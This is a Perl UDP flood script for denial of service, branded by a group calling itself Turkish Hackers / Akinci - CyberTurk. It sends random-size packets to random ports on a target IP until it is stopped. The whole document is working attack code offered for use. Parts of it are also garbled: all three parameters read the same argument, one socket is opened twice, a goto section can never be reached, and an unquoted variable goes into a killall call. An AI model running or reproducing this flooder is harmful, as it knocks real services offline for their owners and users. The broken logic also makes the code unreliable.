#!/usr/bin/perl
use Socket;
$ARGC=@ARGV;
my ($ip,$port,$size,$time);
$ip=$ARGV[0];
$port=$ARGV[0];
$time=$ARGV[0];
socket(crazy, PF_INET, SOCK_DGRAM, 17);
$iaddr = inet_aton("$ip");
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);
printf "[1;35m#[1;33m#[1;31m*[0;32m  
<-|----------------------------|->
<-| TURKISH HACKERS GRUP       ! |->
<-| AKINCILAR HACK PLATFORMS   |-> 
<-|   http://akıncılar.com     |-> 
<-|----------------------------|->
                                                                                    
 [1;36m$ipn";  
printf "[1;35m#[1;33m#[1;31m*[0;32mSite Down[0;31m->>[0m\n";
printf "[1;35m#[1;33m#[1;31m*[0;32mIp Down[0;31m->>> [0m\n";
printf "[1;35m#[1;33m#[1;31m*[0;32mAkinci - CyberTurk  [1;33C->>>>> [1;36m2018[0m\n";
printf "[1;35m#[1;33m#[1;31m*[0;32mSCRIPT[1;36mBY[0;32m|[1;33m Akinci - CyberTurk [0m\n";

 
print "www.instagram.com/davwr1514 - Flooding $ip " . ($port ? $port : "random") . " port with " .
  ($size ? "$size-byte" : "random size") . " packets" .
  ($time ? " for $time seconds" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","saf3e368wumu7repa4uxa2rucHaphubeGamu9R3373af8Us3eTHUgepRAfAS2c6CHAyegURepUbre94wRAwruS2uhU8UXasp7spasw7sw8h7wapr5spabekumu8ast8StRadusASacu6a6e5efrAzeWucH5cumuswaraca7hAbrewrecujetrafefadrawruW4ayAjU37sPUseBr4cRuPhacrUtrf0azrrQlLd1xdSjjtdwXfjyXArkExrVxVlulxssmr0u0lRscLAqjkZB43ajPRmAH4JQ6T1SOZPFmndbEi4IUOIuUmPCXI044f73uGIeJHs8lh36KpJausXqykL2idPx1j120Rra2DI1kmGgde5LI4TJMuQvrotBR3Fli0g1uwt74ALKfRzHYZJR0wkqNncUY178LcbTFtx5n7MF4zX3P4Z3mUVkAebkXqDv6EETKTNBes9kW2QBEBLeKcBH4cUAQ8Y30mdGozVRNJq3wtDMmgtzCibqXEEp3cZATTOMqIDxn3t5HYdspEofPneXpPTUE0TBN8oRAp4DjSlhfDAVmfNgbdSbTHWT7Y7gVi6kgrNXKCM64V4kOGvesVr0SZU3k83r6qAr3w4d26kurU9eBRa53cEtRaQaCHEvacu4PETRaf3yepHAk9FAgU2at8GEMEZAwUjaDesTufu2r3DaPhedR7quCru7reketc8atacAStuGeFruNuTHaWuspabr6drARa4r4cApRewuFRaD3qAXAsPeMAChudRUWxuq73R5dra8epre4tasp8craq677wru5asuq3tradede8rethuSwAfespastuduypUt2fudra5utanewrat83rucruyuje6aphuprUWawrawr4tha922HeSpU8acacu5hastuprecevasteberepagas6ejuje2heswugukerebrajeVeswerajAdagecah3phE9EsutaFrU6erathu2u6utraseCrEjehaChuphEchepeswutrezu86pret6afa"), 0, pack_sockaddr_in($pport, $iaddr));}

if ($ARGV[1] ==0 && $ARGV[2] ==0) {
goto randpackets;
}
if ($ARGV[1] !=0 && $ARGV[2] !=0) {
system("(sleep $time;killall -9 udp) &");
goto packets;
}
if ($ARGV[1] !=0 && $ARGV[2] ==0) {
goto packets;
}
if ($ARGV[1] ==0 && $ARGV[2] !=0) {
system("(sleep $time;killall -9 udp) &"); 
goto randpackets;
}
packets:
for (;;) {
$size=$rand x $rand x $rand;
send(crazy, 0, $size, sockaddr_in($port, $iaddr));
}
randpackets:
for (;;) {
$size=$rand x $rand x $rand;
$port=(rand 65000) +1;
send(crazy, 0, $size, sockaddr_in($port, $iaddr));
}